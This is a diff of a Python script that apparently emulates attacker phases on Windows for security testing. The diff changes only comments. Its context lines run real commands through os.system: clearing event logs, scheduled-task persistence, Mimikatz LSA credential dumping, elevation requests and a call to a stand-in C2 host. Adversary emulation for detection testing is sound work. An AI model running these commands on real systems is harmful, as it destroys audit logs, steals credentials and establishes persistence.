@@ -1,8 +1,7 @@
 import os
 import time
 
-console_log_file = "console_output.txt"
-
+# This Finction will execute malicious Payload
 def simulate_execution():
     try:
         # PowerShell execution to retrieve process information
@@ -10,7 +9,7 @@ def simulate_execution():
         os.system(execution_command)
         result = "Execution via PowerShell successful."
         
-        # Additional execution command from the video
+        # Additional execution command for secondary test
         additional_command = 'powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri http://example.com"'
         os.system(additional_command)
         result += " Additional PowerShell command executed successfully."
@@ -23,6 +22,7 @@ def simulate_execution():
     return result
 
 
+# This function will execute commands to setup persistence on the host
 def simulate_persistence():
     try:
         # Creating a scheduled task to persist the presence
@@ -30,7 +30,7 @@ def simulate_persistence():
         os.system(persistence_command)
         result = "Scheduled task persistence successful."
         
-        # Additional persistence command from the video
+        # Additional execution command for secondary test
         persistence_command_video = 'schtasks /create /tn "MyTask" /tr "C:\\path\\to\\script.bat" /sc daily /st 00:00'
         os.system(persistence_command_video)
         result += " Additional scheduled task created successfully."
@@ -43,7 +43,7 @@ def simulate_persistence():
     return result
 
 
-
+# THis function will perform privelege Escalation
 def simulate_privilege_escalation():
     try:
         # Simulating privilege escalation
@@ -51,7 +51,7 @@ def simulate_privilege_escalation():
         os.system(escalation_command)
         result = "Privilege escalation check completed."
         
-        # Additional privilege escalation command from the video
+        # Additional execution command for secondary test
         escalation_command_video = 'powershell.exe -Command "Start-Process cmd -ArgumentList \'/c whoami /priv\' -Verb runAs"'
         os.system(escalation_command_video)
         result += " Additional privilege escalation command executed."
@@ -64,7 +64,7 @@ def simulate_privilege_escalation():
     return result
 
 
-
+# This funciton will perform defense evasion
 def simulate_defense_evasion():
     try:
         # Clearing Windows event logs
@@ -72,7 +72,7 @@ def simulate_defense_evasion():
         os.system(evasion_command)
         result = "Defense evasion by clearing logs successful."
         
-        # Additional defense evasion command from the video
+        # Additional execution command for secondary test
         evasion_command_video = 'powershell.exe -Command "Clear-EventLog -LogName Application, System"'
         os.system(evasion_command_video)
         result += " Additional event logs cleared successfully."
@@ -85,7 +85,7 @@ def simulate_defense_evasion():
     return result
 
 
-
+# This function will try to gain credentials from the host
 def simulate_credential_access():
     try:
         # Simulating credential access
@@ -93,7 +93,7 @@ def simulate_credential_access():
         os.system(credential_command)
         result = "Credential access via LSASS memory dump simulated."
         
-        # Additional credential access command from the video
+        # Additional execution command for secondary test
         credential_command_video = 'powershell.exe -Command "Invoke-Mimikatz -Command \'lsadump::lsa /patch\'"'
         os.system(credential_command_video)
         result += " Additional credential access command executed."
@@ -106,7 +106,7 @@ def simulate_credential_access():
     return result
 
 
-
+# This funciton will discover files on the host
 def simulate_discovery():
     try:
         # Discovering files and directories
@@ -114,7 +114,7 @@ def simulate_discovery():
         os.system(discovery_command)
         result = "File and directory discovery successful."
         
-        # Additional discovery command from the video
+        # Additional execution command for secondary test
         discovery_command_video = 'powershell.exe -Command "Get-ChildItem -Path C:\\ -Recurse"'
         os.system(discovery_command_video)
         result += " Additional file and directory discovery command executed."
@@ -127,8 +127,7 @@ def simulate_discovery():
     return result
 
 
-
-
+# This funciton will collect details about the host.
 def simulate_collection():
     try:
         # Simulating data collection
@@ -136,7 +135,7 @@ def simulate_collection():
         # os.system(collection_command)
         # result = "Screen capture collection simulated."
         
-        # Additional data collection command from the video
+        # Additional execution command for secondary test
         collection_command_video = 'powershell.exe -Command "Compress-Archive -Path C:\\Users\\Public\\Documents -DestinationPath C:\\Users\\Public\\Documents.zip"'
         os.system(collection_command_video)
         result += " Additional data collection via compression executed."
@@ -149,7 +148,7 @@ def simulate_collection():
     return result
 
 
-
+# This function will simulate Command and COntrol server conneciton
 def simulate_c2():
     try:
         # Simulating command and control
@@ -157,7 +156,7 @@ def simulate_c2():
         os.system(c2_command)
         result = "Command and control simulation successful."
         
-        # Additional C2 command from the video
+        # Additional execution command for secondary test
         c2_command_video = 'powershell.exe -Command "Invoke-RestMethod -Uri http://malicious-c2-server.com"'
         os.system(c2_command_video)
         result += " Additional C2 communication executed."
@@ -170,8 +169,7 @@ def simulate_c2():
     return result
 
 
-
-
+# This funciton will simulate impact. In this case it will try to encrypt files.
 def simulate_impact():
     try:
         # Simulating data encryption
@@ -179,7 +177,7 @@ def simulate_impact():
         os.system(impact_command)
         result = "File encryption impact simulated."
         
-        # Additional impact command from the video
+        # Additional execution command for secondary test
         impact_command_video = 'powershell.exe -Command "Compress-Archive -Path C:\\Test2 -DestinationPath C:\\Test2_encrypted.zip"'
         os.system(impact_command_video)
         result += " Additional impact via compression simulated."
